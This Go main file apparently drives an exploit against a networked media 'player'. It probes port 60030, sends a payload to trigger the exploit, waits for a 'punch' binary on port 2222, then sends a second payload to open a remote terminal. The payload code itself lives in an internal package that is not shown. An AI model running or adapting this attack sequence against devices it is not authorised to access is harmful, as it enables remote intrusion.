package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"github.com/tridentsx/panago/internal"
)

func main() {
	// Ensure IP address is passed as an argument
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <IP_ADDRESS>")
		return
	}
	ipAddress := os.Args[1]

	// Check if anything is listening on port 2222
	if internal.IsPort2222Open(ipAddress) {
		fmt.Println("player already pawned")
		return
	}

	// Check if there is a player on port 60030
	fmt.Println("Checking for player on port 60030...")
	if !internal.IsPlayerAvailable(ipAddress) {
		fmt.Println("No player detected on port 60030.")
		return
	}
	fmt.Println("Player detected on port 60030.")

	// First payload
	fmt.Println("Sending first payload to trigger the exploit...")
	err := internal.SendFirstPayload(ipAddress)
	if err != nil {
		fmt.Printf("Error sending first payload: %v\n", err)
		return
	}

	// Wait for a moment before sending the second payload
	fmt.Println("Waiting for the 'punch' binary to be ready on port 2222...")
	time.Sleep(1 * time.Second) // Adjust the wait time as necessary

	// Check if the punch binary is ready on port 2222
	if !internal.IsPort2222Open(ipAddress) {
		fmt.Println("No player at the given IP or punch binary not ready on port 2222.")
		return
	}

	// Second payload
	fmt.Println("Sending second payload to authenticate and attach terminal...")
	err = internal.SendSecondPayload(ipAddress)
	if err != nil {
		fmt.Printf("Error sending second payload: %v\n", err)
		return
	}

	fmt.Println("Payloads sent successfully!")

	// Prompt user to back up the player
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Do you want to backup your player? (yes/no): ")
	response, _ := reader.ReadString('\n')
	if response == "yes\n" {
		fmt.Println("Backing up the player...")
		// Add your backup logic here
	} else {
		fmt.Println("Player backup skipped.")
	}
}
